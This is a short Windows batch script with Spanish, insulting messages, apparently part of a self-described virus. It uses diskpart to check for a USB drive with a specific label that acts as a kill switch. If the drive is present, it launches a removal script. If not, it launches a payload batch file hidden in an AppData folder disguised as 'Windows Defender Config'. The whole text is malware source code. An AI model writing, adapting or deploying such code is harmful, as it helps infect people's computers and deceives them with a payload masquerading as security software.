REM *** Gracias a _KillerHack ***
@ECHO OFF
:WHILE
CLS

for /f "tokens=3 delims= " %%A in ('ECHO list volume ^| diskpart ^| findstr "CRACIU25YT"') do (set USBDrive=%%A:)

if [%USBDrive%] EQU [] ( 

ECHO [-] USB:      NO!
TIMEOUT>NUL /T 0
TIMEOUT>NUL /T 3
goto :DIE
) ELSE (

ECHO [+] USB:      OK!
TIMEOUT>NUL /T 0
TIMEOUT>NUL /t 3
GOTO :CasiBro
)


:CasiBro
shutdown /r /t 1000 /c "Te libraste puto. Removiendo Lesernav de tu ordenador"
shutdown /a
start "%appdata%\Microsoft\eliminar.bat"
exit

:DIE
shutdown /r /t 1000 /c "No se envio un apagado del virus :c. Procediendo a joderte!"
shutdown /a
start "%appdata%\Microsoft\Windows Defender Config\Lensernav.bat"
exit